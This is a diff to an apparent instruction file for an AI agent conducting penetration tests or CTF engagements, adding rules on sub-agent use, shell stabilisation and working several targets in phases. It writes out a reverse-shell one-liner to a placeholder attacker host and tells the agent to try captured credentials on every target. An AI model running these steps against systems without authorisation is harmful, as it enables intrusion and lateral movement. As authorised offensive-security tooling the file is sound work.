@@ -71,6 +71,33 @@ MUST go through the appropriate skill via the Skill tool.
 **If you are unsure whether a command is on the allowed list, it is not.
 Route to a skill.**
 
+### Do Not Delegate Targets to Sub-Agents
+
+**Never use the Task tool to delegate target-level work to sub-agents.** The
+Skill tool is only available in the main conversation thread. Task sub-agents
+cannot invoke skills — they execute techniques inline, bypassing all skill
+routing, engagement logging, and state management. This defeats the entire
+purpose of the skill library.
+
+This is the orchestrator's most dangerous failure mode in multi-target
+engagements. The temptation to parallelize by spawning one agent per target is
+strong, especially in autonomous mode. Resist it. A sub-agent "doing pentesting"
+without skills is just general-purpose Claude improvising — it skips
+methodology, misses edge cases, and produces inconsistent results.
+
+**What you may use Task sub-agents for:**
+- Pure research (searching for CVE details, reading documentation)
+- Local processing (parsing scan output, cracking hashes, compiling exploits)
+- Anything that does not require skill routing or target interaction
+
+**What you must NOT use Task sub-agents for:**
+- Running scanning or enumeration tools against targets
+- Exploiting vulnerabilities
+- Post-exploitation enumeration or privilege escalation
+- Anything a skill exists for
+
+See "Multi-Target Engagements" (Step 8) for the correct approach.
+
 ### Pre-Routing Checkpoint
 
 Before every skill invocation, write `engagement/state.md` and append to
@@ -331,17 +358,32 @@ Common chains that produce shell access on a host:
 - Command injection confirmed → shell access
 - File upload bypass → web shell → shell access
 
-> **Shell access gained → host discovery routing (mandatory).**
-> When any chain above produces shell access (web shell, reverse shell, SSH,
-> WinRM, database command execution) on a host where you do NOT already have
-> root/SYSTEM, STOP. Do NOT run `sudo -l`, `find -perm -4000`, `whoami /priv`,
-> `net user`, or any host enumeration commands inline. Route to the appropriate
-> discovery skill:
+> **Shell access gained → stabilize → host discovery routing (mandatory).**
+>
+> When any chain above produces command execution on a host, follow this
+> sequence before doing anything else:
+>
+> **1. Stabilize access — get an interactive shell.**
+> A webshell, blind RCE callback, or database command execution is NOT a stable
+> shell. Before routing to discovery, upgrade to an interactive reverse shell:
+> - Linux: `bash -i >& /dev/tcp/ATTACKER/PORT 0>&1`, python pty, or nc
+> - Windows: PowerShell reverse shell, nc.exe, or establish WinRM/SSH if creds
+>   are available
+>
+> Discovery skills assume interactive shell access. Trying to enumerate privesc
+> vectors through a webshell (URL-encoded commands, one-shot execution) is
+> fragile, slow, and misses output that requires an interactive terminal. Get a
+> proper shell first.
+>
+> **2. Route to the appropriate discovery skill.**
+> Do NOT run `sudo -l`, `find -perm -4000`, `whoami /priv`, `net user`, or any
+> host enumeration commands inline. Route:
 >
 > - Linux target → STOP. Invoke **linux-discovery** via the Skill tool.
 > - Windows target → STOP. Invoke **windows-discovery** via the Skill tool.
 >
-> Pass: target hostname/IP, current user, access method, current mode, any
+> Pass: target hostname/IP, current user, access method (specify: interactive
+> reverse shell on port X, SSH session, WinRM, etc.), current mode, any
 > credentials. The discovery skill enumerates systematically and routes to the
 > correct technique skill (sudo/SUID abuse, cron/MOTD exploitation, kernel
 > exploits, token impersonation, etc.). Inline enumeration skips methodology
@@ -426,7 +468,79 @@ type C:\Users\Administrator\Desktop\root.txt
 
 Save output to `engagement/evidence/` with descriptive filenames.
 
-## Step 7: Reporting
+## Step 7: Multi-Target Engagements
+
+When the scope includes multiple targets (multiple IPs, a subnet, a CTF with
+several boxes), the orchestrator must process them without breaking skill
+routing. The key constraint: **skills can only be invoked from the main
+conversation thread**, so all target work must flow through the orchestrator.
+
+### Strategy: Phase-Based Cycling
+
+Process all targets through the same phase before advancing, rather than
+completing one target end-to-end before starting another. This enables
+cross-pollination of discoveries (credentials from target A tested against
+target B) and strategic prioritization.
+
+**Phase 1 — Recon all targets:**
+Invoke **network-recon** for each target (or once for the full scope). Build
+the complete attack surface map in state.md before choosing where to attack.
+
+**Phase 2 — Triage and prioritize:**
+After recon, rank targets by exploitability:
+1. Known CVEs with public exploits
+2. Default/anonymous access (unauthenticated DB, open shares)
+3. Web applications with discoverable attack surface
+4. Services requiring credential attacks
+
+**Phase 3 — Work the highest-value target:**
+Route through discovery → technique skills for the top-priority target. When
+you gain access or get blocked, update state.md and move to the next target.
+
+**Phase 4 — Cross-pollinate:**
+After each target yields credentials or access, check state.md for
+opportunities on other targets:
+- New creds → test against all targets with matching services
+- New network access → check for internal-only services on other targets
+- Patterns (same OS, same app framework) → apply same technique
+
+**Phase 5 — Cycle back:**
+Revisit blocked targets with new information. Repeat until all targets are
+exhausted or objectives are met.
+
+### What NOT To Do
+
+- **Do not spawn one Task sub-agent per target.** Sub-agents cannot invoke
+  skills. This is the single most common orchestrator failure in multi-target
+  engagements — it looks efficient but produces skill-less, methodology-free
+  improvisation on every target.
+- **Do not go deep on one target while ignoring others.** If you're stuck on
+  privesc for target A, move to target B. Fresh targets often yield quick wins
+  that unlock progress elsewhere.
+- **Do not run the same skill on multiple targets simultaneously.** Invoke
+  skills one at a time. The sequential overhead is the price of methodology.
+
+### State Management for Multiple Targets
+
+State.md tracks all targets in one file. Use per-target one-liners:
+
+```markdown
+## Targets
+- 10.10.10.1 | Windows Server 2019 | DC | 53,88,135,389,445,636,3268,3389,5985
+- 10.10.10.5 | Ubuntu 22.04 | Web | 22,80,443
+
+## Access
+- 10.10.10.5 | www-data via reverse shell (port 4444) | from XXE → webshell → rev shell
+- 10.10.10.1 | no access yet
+
+## Credentials
+- admin:Password123 (found on 10.10.10.5, untested on 10.10.10.1)
+```
+
+After each skill invocation, check ALL targets for newly actionable state —
+not just the target that was just worked on.
+
+## Step 8: Reporting
 
 When the engagement is complete (objectives met or testing window closed):
 
